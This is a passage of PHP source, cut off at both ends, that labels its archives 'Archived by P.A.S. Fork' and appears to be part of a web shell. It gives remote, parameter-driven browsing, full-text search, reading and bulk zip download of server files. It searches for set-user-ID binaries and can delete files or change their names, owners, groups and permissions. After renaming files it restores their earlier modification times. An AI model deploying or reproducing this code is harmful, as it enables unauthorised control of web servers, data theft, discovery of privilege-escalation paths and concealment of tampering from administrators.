			if(is_bool($v)){
				$this->d = $v;
				return $v;
			}
		}
		endif;
		$this->d = FALSE;
		
		return FALSE;
	}
	
	function isLink() {
	    if (isset($this->l))
	        return $this->l;
	    
	    $v = lstat($this->fp);
	    
	    if (is_array($v)) {
	        $this->l = ($v[2] & 0170000) === 0120000;
	        return $this->l;
	    }
	    if (!isset($this->t))
	        $this->type();
	    if ($this->t !== FALSE) {
	        $this->l = $this->t === 'link';
	        return $this->l;
	    }
	    $v = is_link($this->fp);
	    if (is_bool($v)) {
	        $this->l = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->isLink();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_bool($v)) {
	                $this->l = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->l = FALSE;
	    return FALSE;
	}
	
	function getLinkTarget() {
	    if (isset($this->f))
	        return $this->f;
	    if (NIX || PHP_VERSION >= '5.3') {
	        $v = readlink($this->fp);
	        if (is_string($v)) {
	            $this->f = $v;
	            return $v;
	        }
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getLinkTarget();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_string($v)) {
	                $this->f = $v;
	                return $v;
	            }
	        }
	    endif;
	    $v = realpath($this->fp);
	    if (is_string($v)) {
	        $this->f = $v;
	        return $v;
	    }
	    $this->f = '';
	    return '';
	}
	
	function getSize() {
	    if (isset($this->s))
	        return $this->s;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->s = $this->i[7];
	        return $this->s;
	    }
	    $v = filesize($this->fp);
	    if (is_int($v)) {
	        $this->s = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getSize();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->s = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->s = -1;
	    return -1;
	}
	
	function getCTime() {
	    if (isset($this->c))
	        return $this->c;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->c = $this->i[10];
	        return $this->c;
	    }
	    $v = filectime($this->fp);
	    if (is_int($v)) {
	        $this->c = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getCTime();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->c = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->c = 0;
	    return 0;
	}
	
	function getMTime() {
	    if (isset($this->m))
	        return $this->m;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->m = $this->i[9];
	        return $this->m;
	    }
	    $v = filemtime($this->fp);
	    if (is_int($v)) {
	        $this->m = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getMTime();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->m = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->m = 0;
	    return 0;
	}
	
	function getOwner() {
	    if (isset($this->o))
	        return $this->o;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->o = $this->i[4];
	        return $this->o;
	    }
	    $v = fileowner($this->fp);
	    if (is_int($v)) {
	        $this->o = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getOwner();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->o = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->o = -1;
	    return -1;
	}
	
	function getGroup() {
	    if (isset($this->g))
	        return $this->g;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->g = $this->i[5];
	        return $this->g;
	    }
	    $v = filegroup($this->fp);
	    if (is_int($v)) {
	        $this->g = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getGroup();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->g = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->g = -1;
	    return -1;
	}
	
	function getPerms() {
	    if (isset($this->p))
	        return $this->p;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->p = $this->i[2];
	        return $this->p;
	    }
	    $v = fileperms($this->fp);
	    if (is_int($v)) {
	        $this->p = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getPerms();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->p = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->p = 0;
	    return 0;
	}
	
	function isReadable() {
	    if (isset($this->r))
	        return $this->r;
	    $v = is_readable($this->fp);
	    if (is_bool($v)) {
	        $this->r = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->isReadable();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_bool($v)) {
	                $this->r = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->r = FALSE;
	    return FALSE;
	}
	
	function isWritable() {
	    if (isset($this->w))
	        return $this->w;
	    $v = is_writable($this->fp);
	    if (is_bool($v)) {
	        $this->w = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->isWritable();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_bool($v)) {
	                $this->w = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->w = FALSE;
	    return FALSE;
	}
	
	function getMode() {
	    $v = 0;
	    if ($this->isReadable())
	        $v += 1;
	    if ($this->isWritable())
	        $v += 2;
	    return $v;
	}
	
	function stat() {
	    $v = stat($this->fp);
	    if (is_array($v)) {
	        $this->i = $v;
	        return;
	    }
	    $v       = lstat($this->fp);
	    $this->i = is_array($v) ? $v : FALSE;
	}
	
	function type() {
	    $v       = filetype($this->rp);
	    $this->t = $v ? $v : FALSE;
	}
	
	function spl() {
	    $this->fi = FALSE;
	    if (PHP_VERSION >= '5'):
	        if (PHP_VERSION >= '5.1.2') {
	            try {
	                $this->fi = new SplFileInfo($this->rp);
	            }
	            catch (Exception $e) {
	                $this->fi = FALSE;
	            }
	        }
	    endif;
	}
	
}


if(isset($D['a'])){
	
	class PZIP {
	    var $_bpl = '', $_cdfh = NULL, $_cdfp = NULL, $_cdfo = FALSE, $_cdrc = 0, $_cdso = 0, $_flrs = array();
	    function init($bp='') {
	        $this->_bpl = strlen($bp);
	        if ($h = tmpfile())
	            $this->_cdfh = $h;
	        else {
	            $n = tempName();
	            $a = array(
	                'upload_tmp_dir',
	                'session.save_path',
	                'user_dir',
	                'doc_root'
	            );
	            foreach ($a as $v)
	                if ($p = ini_get($v)) {
	                    $p .= DSC . $n;
	                    if ($h = fopen($p, 'bw+')) {
	                        flock($h, LOCK_EX);
	                        $this->_cdfh = $h;
	                        $this->_cdfp = $p;
	                        return TRUE;
	                    }
	                    if (PHP_VERSION >= '5'):
	                        if (PHP_VERSION >= '5.1') {
	                            try {
	                                $h = new SplFileObject($p, 'bw+');
	                            }
	                            catch (Exception $e) {
	                                $h = NULL;
	                            }
	                            if ($h) {
	                                $h->flock(LOCK_EX);
	                                $this->_cdfh = $h;
	                                $this->_cdfp = $p;
	                                $this->_cdfo = TRUE;
	                                return TRUE;
	                            }
	                        }
	                    endif;
	                }
	            $p = selfPath() . $n;
	            if ($h = fopen($p, 'bw+')) {
	                flock($h, LOCK_EX);
	                $this->_cdfh = $h;
	                $this->_cdfp = $p;
	                return TRUE;
	            }
	            if (PHP_VERSION >= '5'):
	                if (PHP_VERSION >= '5.1') {
	                    try {
	                        $h = new SplFileObject($p, 'bw+');
	                    }
	                    catch (Exception $e) {
	                        $h = NULL;
	                    }
	                    if ($h) {
	                        $h->flock(LOCK_EX);
	                        $this->_cdfh = $h;
	                        $this->_cdfp = $p;
	                        $this->_cdfo = TRUE;
	                        return TRUE;
	                    }
	                }
	            endif;
	        }
	        return FALSE;
	    }
	    function fileHeader($n, $t) {
	        echo "\x50\x4b\x03\x04\x14\x00\x08\x00\x00\x00", $t, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", pack('v', strlen($n)), "\x00\x00", $n;
	        ob_start('zipCalc', 1048576);
	    }
	    function fileFooter($n, $t) {
	        ob_end_flush();
	        $v = zipCalc(NULL);
	        $s = pack('V', $v[0]);
	        $c = pack('V', $v[1] ^ 0xffffffff);
	        echo "\x50\x4b\x07\x08", $c, $s, $s;
	        $fh   = $this->_cdfh;
	        $nl   = strlen($n);
	        $data = "\x50\x4b\x01\x02\x00\x00\x14\x00\x08\x00\x00\x00" . $t . $c . $s . $s . pack('v', $nl) . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . pack('V', $this->_cdso) . $n;
	        if ($this->_cdfo) {
	            $fh->fwrite($data);
	            $fh->fflush();
	        } else {
	            fwrite($fh, $data);
	            fflush($fh);
	        }
	        ++$this->_cdrc;
	        $this->_cdso += 46 + $v[0] + $nl;
	    }
	    function addPath($p) {
	        $f = new FileInfo($p);
	        if ($f->isDir()) {
	            if (substr($p, -1) !== DSC)
	                $p .= DSC;
	            $f = NULL;
	            if (!dirRead($p, array(
	                &$this,
	                'addPath'
	            )))
	                $this->_flrs[] = substr($p, $this->_bpl);
	        } else {
	            $t = packTime($f->getMTime());
	            $f = substr($p, $this->_bpl);
	            if (!NIX)
	                $f = str_replace(DSC, '/', $f);
	            $this->fileHeader($f, $t);
	            if (!outFile($p))
	                $this->_flrs[] = $f;
	            $this->fileFooter($f, $t);
	        }
	    }
	    function close() {
	        if (count($this->_flrs) > 0) {
	            $n = 'CANT_READ.txt';
	            $t = packTime(time());
	            $this->fileHeader($n, $t);
	            foreach ($this->_flrs as $v)
	                echo $v, "\n";
	            $this->fileFooter($n, $t);
	        }
	        $fh = $this->_cdfh;
	        if ($this->_cdfo) {
	            $s = $fh->ftell();
	            $fh->fseek(0);
	            if (!is_int($fh->fpassthru()))
	                while (!$fh->eof())
	                    echo $fh->fread(1048576);
	            $fh->flock(LOCK_UN);
	            unset($fh, $this->_cdfh);
	        } else {
	            $s = ftell($fh);
	            fseek($fh, 0);
	            if (!is_int(fpassthru($fh)))
	                while (!feof($fh))
	                    echo fread($fh, 1048576);
	            flock($fh, LOCK_UN);
	            fclose($fh);
	        }
	        if ($this->_cdfp !== NULL)
	            delFile($this->_cdfp);
	        $v = pack('v', $this->_cdrc);
	        $c = 'Archived by P.A.S. Fork v. ' . VER;
	        echo "\x50\x4b\x05\x06\x00\x00\x00\x00", $v, $v, pack('V', $s), pack('V', $this->_cdso), pack('v', strlen($c)), $c;
	        sDie();
	    }
}
	
function packTime($v) {
    $v = getdate($v);
    return pack('vv', (($v['hours'] << 11) + ($v['minutes'] << 5) + $v['seconds'] >> 1), ((($v['year'] - 1980) << 9) + ($v['mon'] << 5) + $v['mday']));
}

if (!defined('PHP_INT_MAX'))
    define('PHP_INT_MAX', intval('10000000000000000000'));
    
function zipCalc($buff) {
    static $crcTbl = NULL, $chrTbl = NULL, $dataSize = 0, $crcSum = 0xffffffff, $shftFix = 0;
    if ($crcTbl === NULL) {
        $shftFix = PHP_INT_MAX >> 0;
        for ($i = 0; $i < 256; ++$i) {
            $v = $i;
            for ($j = 8; $j; --$j)
                $v = $v & 1 ? $v >> 1 & $shftFix ^ 0xEDB88320 : $v >> 1 & $shftFix;
            $crcTbl[]        = $v;
            $chrTbl[chr($i)] = $i;
        }
        $shftFix = PHP_INT_MAX >> 7;
    } elseif ($buff === NULL) {
        $v        = array(
            $dataSize,
            $crcSum
        );
        $dataSize = 0;
        $crcSum   = 0xffffffff;
        return $v;
    }
    $c = strlen($buff);
    $dataSize += $c;
    for ($i = 0; $i < $c; ++$i)
        $crcSum = $crcTbl[$crcSum & 0xFF ^ $chrTbl[$buff[$i]]] ^ $crcSum >> 8 & $shftFix;
    return $buff;
}

function jsonEcho($v) {
    static $s = NULL, $r = NULL;
    if ($s === NULL) {
        $s = array(
            '\\',
            '"'
        );
        $r = array(
            '\u005c',
            '\u0022'
        );
        for ($i = 0; $i <= 0x1F; ++$i) {
            $s[] = chr($i);
            $r[] = sprintf('\u00%02s', dechex($i));
        }
    }
    echo $v === NULL ? '"NULL"' : '"' . str_replace($s, $r, $v) . '"';
}

switch ($D['a']) {
    case 'f':
        function testProp($a, $v) {
            foreach ($a as $i)
                if (is_array($i)) {
                    if (count($i) === 2) {
                        if ($v > $i[0] && $v < $i[1])
                            return TRUE;
                    } elseif (isset($i[0])) {
                        if ($v > $i[0])
                            return TRUE;
                    } elseif ($v < $i[1])
                        return TRUE;
                } elseif ($v === $i)
                    return TRUE;
            return FALSE;
        }
        class Searcher {
            var $f, $d, $p, $a;
            function __construct($v) {
                echo '{"f":[';
                $this->f = $v;
                $this->d = 0;
                $this->p = NULL;
                $this->a = array();
            }
            function filter($v) {
                $i = new FileInfo($v);
                $k = $i->getFileName();
                $f = $this->f;
                if ($k === '.' || $k === '..')
                    return;
                if ($i->isLink() && !isset($f['l']))
                    return;
                $b = $i->isDir();
                if ($b && (!isset($f['d']) || $f['d'] > $this->d))
                    $this->a[] = $v;
                if (isset($f['y']) && ($f['y'] === 1 ? !$b : $b))
                    return;
                if (isset($f['p']) && $i->getMode() < $f['p'])
                    return;
                if (!$b && isset($f['u']) && ($i->getPerms() & 0007000) !== 0004000)
                    return;
                if (isset($f['n'])) {
                    if ($k !== $f['n'])
                        return;
                } elseif (isset($f['i'])) {
                    if (strcasecmp($k, $f['i']) !== 0)
                        return;
                } elseif (isset($f['r'])) {
                    if (!preg_match($f['r'], $k))
                        return;
                }
                if (isset($f['o']) && !testProp($f['o'], $i->getOwner()))
                    return;
                if (isset($f['g']) && !testProp($f['g'], $i->getGroup()))
                    return;
                if (isset($f['e']) && !testProp($f['e'], $i->getCTime()))
                    return;
                if (isset($f['m']) && !testProp($f['m'], $i->getMTime()))
                    return;
                if (!$b && isset($f['z']) && !testProp($f['z'], $i->getSize()))
                    return;
                if (!$b && (isset($f['t']) || isset($f['v']) || isset($f['x']))) {
                    if (!is_string($k = getFile($v)))
                        return;
                    if (isset($f['t'])) {
                        if (strpos($k, $f['t']) === FALSE)
                            return;
                    } elseif (isset($f['v'])) {
                        if (stristr($k, $f['v']) === FALSE)
                            return;
                    } elseif (!preg_match($f['x'], $k))
                        return;
                }
                $k = $i->getPath();
                if ($this->p !== $k) {
                    if ($this->p !== NULL)
                        echo ']},';
                    echo '{"p":';
                    jsonEcho($k);
                    $this->p = $k;
                    $k       = new FileInfo($k);
                    echo ',"m":', $k->getMode(), ',"f":[';
                }
                outFileInfo($i);
            }
            function search($v) {
                $this->a = array();
                dirRead($v, array(
                    &$this,
                    'filter'
                ));
                if (!isset($this->f['d']) || $this->f['d'] > $this->d) {
                    ++$this->d;
                    $a = $this->a;
                    foreach ($a as $v)
                        $this->search($v);
                }
            }
            function finish() {
                if ($this->p !== NULL) {
                    echo ']}]';
                    outFileInfo(NULL, TRUE);
                } else
                    echo ']';
                sDie('}');
            }
        }
        function dirRead($p, $f) {
            $b = is_string($f);
            if (substr($p, -1) !== DSC)
                $p .= DSC;
            if ($v = opendir($p)) {
                while (($i = readdir($v)) !== FALSE)
                    if ($i !== '.' && $i !== '..')
                        $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
                closedir($v);
                return TRUE;
            }
            if ($v = dir($p)) {
                while (($i = $v->read()) !== FALSE)
                    if ($i !== '.' && $i !== '..')
                        $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
                $v->close();
                return TRUE;
            }
            if (PHP_VERSION >= '5'):
                try {
                    $v = new DirectoryIterator($p);
                }
                catch (Exception $e) {
                    $v = FALSE;
                }
                if ($v) {
                    foreach ($v as $i) {
                        $n = $i->getFileName();
                        if ($n !== '.' && $n !== '..')
                            $b ? $f($i) : $f[0]->{$f[1]}($i);
                    }
                    unset($i, $v);
                    return TRUE;
                }
                try {
                    $v = new RecursiveDirectoryIterator($p);
                }
                catch (Exception $e) {
                    $v = FALSE;
                }
                if ($v) {
                    foreach ($v as $i)
                        $b ? $f($i) : $f[0]->{$f[1]}($i);
                    unset($i, $v);
                    return TRUE;
                }
                if (PHP_VERSION >= '5.3') {
                    try {
                        $v = new FilesystemIterator($p);
                    }
                    catch (Exception $e) {
                        $v = FALSE;
                    }
                    if ($v) {
                        foreach ($v as $i)
                            $b ? $f($i) : $f[0]->{$f[1]}($i);
                        unset($i, $v);
                        return TRUE;
                    }
                }
                $v = defined('SCANDIR_SORT_NONE') ? scandir($p, SCANDIR_SORT_NONE) : scandir($p);
                if ($v !== FALSE) {
                    foreach ($v as $i)
                        if ($i !== '.' && $i !== '..')
                            $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
                    return TRUE;
                }
            endif;
            if (PHP_VERSION >= '4.3' && defined('GLOB_BRACE') && ($v = glob($p . DSC . '{,.}*', GLOB_NOESCAPE | GLOB_NOSORT | GLOB_BRACE))) {
                foreach ($v as $i) {
                    $n = fileName($i);
                    if ($n !== '.' && $n !== '..')
                        $b ? $f($i) : $f[0]->{$f[1]}($i);
                }
                return TRUE;
            }
            if (PHP_VERSION >= '5'):
                if (PHP_VERSION >= '5.3') {
                    try {
                        $v = new GlobIterator($p . '*');
                    }
                    catch (Exception $e) {
                        $v = FALSE;
                    }
                    if ($v && count($v) > 0) {
                        foreach ($v as $i)
                            $b ? $f($i) : $f[0]->{$f[1]}($i);
                        unset($i, $v);
                        return TRUE;
                    }
                }
            endif;
            return FALSE;
        }
        function delDir($p) {
            dirRead($p, 'delFOD');
            return rmdir($p);
        }
        function delFOD($f) {
            $f = new FileInfo($f);
            $n = $f->getFileName();
            if ($n !== '.' && $n !== '..')
                return (!$f->isLink() && $f->isDir()) ? delDir($f->getPathName()) : delFile($f->getPathName());
        }
        function isInt($v) {
            return (string) $v === (string) (int) $v;
        }
        function jsonFileInfo($f, $b) {
            echo '[';
            jsonEcho($b ? $f->getPathName() : $f->getFileName());
            echo ',', $f->isDir() ? 'null' : $f->getSize(), ',', (TM ? $f->getCTime() : $f->getMTime()), ',', $f->getMode(), ',"', $f->getPerms(), '"';
            if (NIX) {
                echo ',', $f->getOwner(), ',', $f->getGroup();
                if ($b) {
                    echo ',';
                    jsonEcho(uName($f->getOwner()));
                    echo ',';
                    jsonEcho(gName($f->getGroup()));
                }
            }
            if ($f->isLink()) {
                echo ',';
                jsonEcho($f->getLinkTarget());
            }
            echo ']';
        }
        function outFileInfo($f, $b = NULL) {
            static $p = NULL, $o = array(), $g = array();
            if ($b === TRUE) {
                if (!NIX || count($o) === 0)
                    return;
                $b = FALSE;
                echo ',"o":{';
                foreach ($o as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    echo '"', $k, '":';
                    jsonEcho(uName($k));
                }
                $b = FALSE;
                echo '},"g":{';
                foreach ($g as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    echo '"', $k, '":';
                    jsonEcho(gName($k));
                }
                echo '}';
                return;
            }
            if ($b === FALSE) {
                $p = NULL;
                return;
            }
            if (!isset($f->fp))
                $f = new FileInfo($f);
            if ($p === $f->getPath())
                echo ',';
            else
                $p = $f->getPath();
            jsonFileInfo($f, FALSE);
            if (NIX) {
                $o[$f->getOwner()] = 1;
                $g[$f->getGroup()] = 1;
            }
        }
        function outFile($p) {
						
            if (RO && is_int(readfile($p))){
                return TRUE;
			}

            if (RO && copy($p, 'php://output'))
                return TRUE;
            
            
            if ($v = fopen($p, 'rb')) {
                if (!is_int(fpassthru($v)))
                    while (!feof($v))
                        echo fread($v, 1048576);
                fclose($v);
                return TRUE;
            }
            if (defined('FORCE_GZIP')) {
                if (RO && is_int(readgzfile($p)))
                    return TRUE;
                if ($v = gzopen($p)) {
                    if (!is_int(gzpassthru($v)))
                        while (!gzeof($v))
                            echo gzread($v, 1048576);
                    gzclose($v);
                    return TRUE;
                }
            }
            if (PHP_VERSION >= '5'):
                if (PHP_VERSION >= '5.1') {
                    try {
                        $v = new SplFileObject($p, 'rb');
                    }
                    catch (Exception $e) {
                        $v = FALSE;
                    }
                    if ($v) {
                        if (!is_int($v->fpassthru()))
                            while (!$v->eof())
                                echo $v->fgets();
                        unset($v);
                        return TRUE;
                    }
                }
            endif;
            if (PHP_VERSION >= '4.3') {
                $v = file_get_contents($p);
                if (is_string($v)) {
                    echo $v;
                    return TRUE;
                }
            }
            $v = file($p);
            if (is_array($v)) {
                foreach ($v as $i)
                    echo $i;
                return TRUE;
            }
            if (defined('FORCE_GZIP')) {
                $v = gzfile($p);
                if (is_array($v)) {
                    foreach ($v as $i)
                        echo $i;
                    return TRUE;
                }
            }
            return FALSE;
        }
        if (isset($D['s'])) {
            $a = array();
            $e = '{"e":"You have syntax error in %s pattern"}';
            if (isset($D['n'])) {
                if (isset($D['w'])) {
                    $r = '#^';
                    $c = '';
                    $p = '';
                    $q = 0;
                    $b = FALSE;
                    for ($i = 0, $l = strlen($D['n']); $i < $l; ++$i) {
                        $c = $D['n'][$i];
                        if ($q > 0 && $c !== '?') {
                            $r .= '.';
                            if ($q > 1)
                                $r .= '{' . $q . '}';
                            $q = 0;
                        }
                        switch ($c) {
                            case '*':
                                if ($c !== $p)
                                    $r .= '.*';
                                break;
                            case '?':
                                ++$q;
                                break;
                            case '\\':
                                if ($i + 1 >= $l)
                                    sDie(sprintf($e, 'name'));
                                $r .= $c . $D['n'][++$i];
                                break;
                            case '[':
                                ++$b;
                                $r .= $c;
                                break;
                            case ']':
                                --$b;
                                $r .= $c;
                                break;
                            case '-':
                                $r .= $b > 0 ? $c : '\\-';
                                break;
                            case '!':
                                $r .= $p === '[' ? '^' : '\\!';
                                break;
                            default:
                                $r .= addcslashes($c, '.+^$(){}=<>|:#');
                                break;
                        }
                        $p = $c;
                    }
                    if ($q > 0) {
                        $r .= '.';
                        if ($q > 1)
                            $r .= '{' . $q . '}';
                    }
                    $r .= '$#';
                    if (isset($D['i']))
                        $r .= 'i';
                    if (preg_match($r, '') === FALSE)
                        sDie(sprintf($e, 'name'));
                    $a['r'] = $r;
                } elseif (isset($D['i']))
                    $a['i'] = $D['n'];
                else
                    $a['n'] = $D['n'];
            }
            if (isset($D['t'])) {
                if (isset($D['x'])) {
                    if (preg_match('#' . $D['x'] . '#', '') === FALSE)
                        sDie(sprintf($e, 'text'));
                    $a['x'] = '#' . $D['t'] . '#';
                    if (isset($D['v']))
                        $a['x'] .= 'i';
                } elseif (isset($D['v']))
                    $a['v'] = $D['t'];
                else
                    $a['t'] = $D['t'];
            }
            $i = array(
                'l',
                'd',
                'y',
                'p',
                'u'
            );
            foreach ($i as $k)
                if (isset($D[$k]))
                    $a[$k] = (int) $D[$k];
            $i = array(
                'o',
                'g',
                'z'
            );
            foreach ($i as $k)
                if (isset($D[$k])) {
                    $s = explode(',', $D[$k]);
                    foreach ($s as $n => $v)
                        if (strpos($v, '-')) {
                            $v         = explode('-', $v, 2);
                            $a[$k][$n] = array(
                                (int) $v[0],
                                (int) $v[1]
                            );
                        } else
                            switch (substr(trim($v), 0, 1)) {
                                case '>':
                                    $a[$k][$n][0] = (int) substr(trim($v), 1);
                                    break;
                                case '<':
                                    $a[$k][$n][1] = (int) substr(trim($v), 1);
                                    break;
                                default:
                                    $a[$k][$n] = (int) $v;
                                    break;
                            }
                }
            $i = array(
                'e',
                'm'
            );
            foreach ($i as $k)
                if (isset($D[$k])) {
                    $s = explode(',', $D[$k]);
                    foreach ($s as $n => $v)
                        if (strpos(' - ', $v)) {
                            $v         = explode(' - ', $v, 2);
                            $a[$k][$n] = array(
                                strtotime(trim($v[0]) . 'UTC'),
                                strtotime(trim($v[1]) . 'UTC')
                            );
                        } else
                            switch (substr(trim($v), 0, 1)) {
                                case '>':
                                    $a[$k][$n][0] = strtotime(substr(trim($v), 1) . 'UTC');
                                    break;
                                case '<':
                                    $a[$k][$n][1] = strtotime(substr(trim($v), 1) . 'UTC');
                                    break;
                                default:
                                    $a[$k][$n] = strtotime(trim($v) . 'UTC');
                                    break;
                            }
                }
            $s = new Searcher($a);
            foreach ($D['s'] as $v)
                $s->search($v);
            $s->finish();
        }
        if (isset($D['g'])) {
            if ($D['g'] === '~' || $D['g'] === '')
                $D['g'] = selfPath();
            $i = new FileInfo($D['g']);
            if (substr($D['g'], -1) === DSC || $i->isDir()) {
                echo '{"p":';
                if (substr($D['g'], -1) !== DSC)
                    $D['g'] .= DSC;
                jsonEcho($D['g']);
                echo ',"m":', $i->getMode(), ',"f":[';
                dirRead($i->getPathName(), 'outFileInfo');
                echo ']';
                outFileInfo(NULL, TRUE);
                sDie('}');
            }
            echo "\x01\x02";
            $b = outFile($D['g']);
            echo "\x03\x1E";
            if ($b) {
                echo "\x06[";
                jsonEcho($D['g']);
                echo ',', $i->getMode(), ']';
            } else
                echo "\x15", $D['g'];
            sDie("\x17\x04\x10");
        }
        if (isset($D['i'])) {
            jsonFileInfo(new FileInfo($D['i']), TRUE);
            sDie();
        }
        if (isset($D['h'])) {
            echo '{';
            $a = array();
            $t = array();
            $e = array();
            $b = NULL;
            $m = count($D['h']) > 1;
            if ($m && isset($D['p']) && substr($D['p'], -1) !== DSC)
                $D['p'] .= DSC;
            if (isset($D['t']))
                $D['t'] = strtotime($D['t'] . 'UTC');
            if (isset($D['e']))
                $D['e'] = intval($D['e'], 8);
            if (isset($D['r']) && isInt($D['r']))
                $D['r'] = (int) $D['r'];
            if (isset($D['o']) && isInt($D['o']))
                $D['o'] = (int) $D['o'];
            sort($D['h']);
            foreach ($D['h'] as $v) {
                if (isset($D['p'])) {
                    parsePath($v, $s, $n);
                    if ($m) {
                        $d = $D['p'];
                        $p = $d . $n;
                    } else {
                        $d = filePath($D['p']);
                        $p = $D['p'];
                    }
                    $c = array();
                    if (!isset($t[$s])) {
                        $i = new FileInfo($s);
                        $i = $i->getMTime();
                        if ($i)
                            $c[$s] = $i;
                    }
                    if (!isset($t[$d])) {
                        $i = new FileInfo($d);
                        $i = $i->getMTime();
                        if ($i)
                            $c[$d] = $i;
                    } else
                        $i = $t[$d];
                    if (!isset($D['t']) && $i)
                        $c[$p] = $i;
                    if (rename($v, $p)) {
                        if ($s !== $b) {
                            echo $b === NULL ? '"r":[' : ']},';
                            echo '{"p":';
                            jsonEcho($s);
                            echo ',"f":[';
                            $b = $s;
                        } else
                            echo ',';
                        jsonEcho($n);
                        $t += $c;
                        $v     = $p;
                        $a[$p] = 1;
                    } else
                        $e[$v][] = 'path';
                }
                if (isset($D['t'])) {
                    if (touch($v, $D['t']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'modified date';
                }
                if (isset($D['e'])) {
                    if (chmod($v, $D['e']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'permission';
                }
                if (isset($D['r'])) {
                    if (chgrp($v, $D['r']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'group';
                }
                if (isset($D['o'])) {
                    if (chown($v, $D['o']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'owner';
                }
            }
            $b = $b !== NULL;
            if ($b)
                echo ']}]';
            if (count($a) > 0) {
                if ($b)
                    echo ',';
                else
                    $b = TRUE;
                echo '"c":[{"p":';
                foreach ($t as $k => $v)
                    touch($k, $v);
                clearstatcache();
                ksort($a);
                $p = NULL;
                foreach ($a as $v => $k) {
                    $k = filePath($v);
                    if ($k !== $p) {
                        if ($p !== NULL)
                            echo ']},{"p":';
                        jsonEcho($k);
                        echo ',"f":[';
                        $p = $k;
                    }
                    outFileInfo($v);
                }
                echo ']}]';
                outFileInfo(NULL, TRUE);
            }
            if ($e) {
                if ($b)
                    echo ',';
                $b = FALSE;
                echo '"e":[';
                foreach ($e as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    jsonEcho(implode(', ', $v) . ' for ' . $k);
                }
                echo ']';
            }
            sDie('}');
        }
        if (isset($D['d'])) {
            if (is_array($D['d'])) {
                $v = new PZIP();
                $v->init($D['DBP']);
                foreach ($D['d'] as $i)
                    $v->addPath($i);
                $v->close();
            }
            $v = new FileInfo($D['d']);
            if ($v->isDir()) {
                $v = new PZIP();
                $v->init($D['d']);
                $v->addPath($D['d']);
                $v->close();
            }
            if (outFile($D['d']) || defined('CED'))
                sDie();
            header('Content-Disposition: inline');
            header('Content-Type: application/json; charset=' . CSE);
            sDie('0');
        }
        if (isset($D['u'])) {
            echo '{';
            $a = array();
            $e = array();
            $b = FALSE;
            $k = NULL;
            sort($D['u']);
            foreach ($D['u'] as $v) {
                parsePath($v, $p, $n);
                if (!isset($a[$p])) {
